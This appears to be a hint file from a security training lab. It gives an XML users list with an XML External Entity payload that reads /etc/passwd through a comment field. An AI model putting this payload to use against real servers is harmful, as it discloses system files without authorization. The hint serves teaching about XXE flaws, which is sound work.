# Hint 6

XML with XXE example:

```xml
<?xml version="1.1" encoding="UTF-8" standalone="yes"?>

<!DOCTYPE bar [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<users>
    <user>
        <firstname>Matt</firstname>
        <lastname>Murdock</lastname>
        <username>Daredevil</username>
        <password>BlindFighter</password>
        <comment>&xxe;</comment>
    </user>
    <user>
        <firstname>Dick</firstname>
        <lastname>Grayson</lastname>
        <username>Robin</username>
        <password>boyWonder</password>
        <comment>The junior counterpart of Batman</comment>
    </user>
</users>
```